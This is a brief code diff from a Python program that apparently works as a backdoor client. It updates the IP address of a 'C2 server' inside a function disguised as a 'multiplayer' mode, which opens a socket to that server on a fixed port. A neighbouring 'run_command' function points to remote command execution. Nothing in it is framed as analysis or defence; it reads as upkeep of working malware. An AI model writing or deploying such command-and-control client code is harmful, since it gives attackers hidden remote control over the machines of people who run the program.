@@ -85,7 +85,7 @@ def run_command(command):
 
 # Function for the "multiplayer" mode
 def multiplayer():
-    HOST = "192.168.1.101"  # Replace with the actual IP of the C2 server
+    HOST = "172.16.201.13"  # Replace with the actual IP of the C2 server
     PORT = 13921 # Make sure this matches the port in the server file
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
